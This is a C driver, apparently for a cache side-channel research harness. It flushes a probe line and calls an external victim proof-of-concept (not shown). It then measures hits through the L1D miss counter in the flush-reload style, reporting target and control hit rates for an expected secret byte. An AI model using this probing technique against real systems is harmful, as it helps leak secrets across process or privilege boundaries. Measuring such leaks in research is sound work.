// auto_stage1_2_3_driver.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include "stage3_observer.h"

// Victim PoC 接口
void vf_run_attack_once(void);
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s);
void vf_prepare_probe_region(int candidate_count);

// pmu_helper 接口
uint64_t pmu_read_l1d_miss(void);

static inline void flush_line(volatile uint8_t *addr) {
    _mm_clflush((void *)addr);
    _mm_mfence();
}

static int probe_line_via_l1d_miss(volatile uint8_t *addr) {
    _mm_lfence();
    uint64_t m0 = pmu_read_l1d_miss();
    _mm_lfence();
    (void)*addr;
    _mm_lfence();
    uint64_t m1 = pmu_read_l1d_miss();
    _mm_lfence();
    uint64_t delta = m1 - m0;
    return (delta == 0);  // 1 = hit, 0 = miss
}

static int stage3_enabled = 0;
static stage3_config_t g_stage3_cfg;


/* ✅ 新增：全局变量保存秘密值（从环境变量读取） */
static uint8_t g_expected_secret = 0;

/* ✅ 新增：从环境变量读取秘密值 */
static void init_expected_secret_from_env(void)
{
    const char *secret_env = getenv("VF_EXPECTED_SECRET");
    if (secret_env && secret_env[0] != '\0') {
        // 支持两种格式：
        // 1. 单字符：VF_EXPECTED_SECRET='Y'
        // 2. 数字：VF_EXPECTED_SECRET=89
        if (strlen(secret_env) == 1) {
            g_expected_secret = (uint8_t)secret_env[0];
        } else {
            g_expected_secret = (uint8_t)atoi(secret_env);
        }
    } else {
        // 默认值：'Y'
        g_expected_secret = (uint8_t)'Y';
    }
    
    fprintf(stderr, "Driver: Expected secret = 0x%02x ('%c')\n", 
            g_expected_secret, 
            (g_expected_secret >= 32 && g_expected_secret < 127) ? g_expected_secret : '?');
}


static void init_stage3_from_env(void)
{
    const char *enable = getenv("ENABLE_STAGE3");
    if (!enable || strcmp(enable, "1") != 0) {
        stage3_enabled = 0;
        return;
    }

    const char *mode_s = getenv("STAGE3_MODE");
    if (!mode_s) mode_s = "flush-reload";

    stage3_mode_t mode;
    if (stage3_parse_mode(mode_s, &mode) != 0) {
        fprintf(stderr, "Invalid STAGE3_MODE=%s\n", mode_s);
        stage3_enabled = 0;
        return;
    }

    g_stage3_cfg.mode = mode;
    g_stage3_cfg.rounds = 100;
    g_stage3_cfg.attack_repetitions = 1;
    g_stage3_cfg.candidate_count = 256;
    g_stage3_cfg.verbose = 0;

    stage3_enabled = 1;
}

static void print_stage3_round_result(int round_idx, const stage3_result_t *r)
{
    printf("STAGE3_ROUND%d_EXPECTED=%u\n", round_idx, (unsigned)r->expected_secret);
    printf("STAGE3_ROUND%d_TOP1=%u\n", round_idx, (unsigned)r->top1_value);
    printf("STAGE3_ROUND%d_TOP2=%u\n", round_idx, (unsigned)r->top2_value);
    printf("STAGE3_ROUND%d_TOP1_SCORE=%d\n", round_idx, r->top1_score);
    printf("STAGE3_ROUND%d_TOP2_SCORE=%d\n", round_idx, r->top2_score);
    printf("STAGE3_ROUND%d_MATCH=%d\n", round_idx, r->match);
}

static void maybe_run_stage3_after_stage2_round(int round_idx, uint8_t expected_secret)
{
    if (!stage3_enabled) return;

    stage3_result_t r;
    if (stage3_run_single_reuse_secret(&g_stage3_cfg, expected_secret, &r) != 0) {
        fprintf(stderr, "Stage3 failed for round %d\n", round_idx);
        return;
    }
    print_stage3_round_result(round_idx, &r);
}

/**
 * 在 secret = s 的条件下，对 target_s 做多次试验
 */
static void stage2_round_dual(uint8_t secret,
                              uint8_t target_s,
                              int trials,
                              int *out_hits_target,  int *out_total_target,
                              int *out_hits_control, int *out_total_control)
{  

    volatile uint8_t *probe_target  = vf_get_probe_addr_for_secret(target_s);

    int hits_t = 0, total_t = 0;
    int hits_c = 0, total_c = 0;

    for (int i = 0; i < trials; i++) {
        flush_line(probe_target);

        for (volatile int z = 0; z < 100; z++) {}

        vf_run_attack_once();

        for (volatile int z = 0; z < 100; z++) {}

        int hit_t = probe_line_via_l1d_miss(probe_target);

        total_t++;
        hits_t += hit_t;
    }

    for (int i = 0; i < trials; i++) {
        flush_line(probe_target);
        for (volatile int z = 0; z < 100; z++) {}   // 同样的等待

        for (volatile int z = 0; z < 100; z++) {}   // 同样的等待

        int hit_c = probe_line_via_l1d_miss(probe_target);

        total_c++;
        hits_c += hit_c;
    }

    *out_hits_target   = hits_t;
    *out_total_target  = total_t;
    *out_hits_control  = hits_c;
    *out_total_control = total_c;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    init_expected_secret_from_env();
    init_stage3_from_env();

    int trials = 1000;

    uint8_t s0 = g_expected_secret;
    int hits_t0, tot_t0, hits_c0, tot_c0;
    stage2_round_dual(s0, s0, trials,
                      &hits_t0, &tot_t0,
                      &hits_c0, &tot_c0);

    // 直接复用 Stage2 刚刚设置过的 secret=s0
    maybe_run_stage3_after_stage2_round(0, s0);

    printf("STAGE2_ROUND0_SECRET=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_TARGET_VALUE=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_TARGET_HITS=%d\n", hits_t0);
    printf("STAGE2_ROUND0_TARGET_TOTAL=%d\n", tot_t0);

    /* 这里 control 的语义仍然是“同一 target line 在无攻击条件下的背景命中率” */
    printf("STAGE2_ROUND0_CONTROL_VALUE=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_CONTROL_HITS=%d\n", hits_c0);
    printf("STAGE2_ROUND0_CONTROL_TOTAL=%d\n", tot_c0);

    double r0_t = (tot_t0 > 0) ? (double)hits_t0 / tot_t0 : 0.0;
    double r0_c = (tot_c0 > 0) ? (double)hits_c0 / tot_c0 : 0.0;

    printf("Round0: secret=%u, target=%u, control=%u, "
           "target_rate=%.3f, control_rate=%.3f\n",
           (unsigned)s0, (unsigned)s0, (unsigned)s0, r0_t, r0_c);

    return 0;
}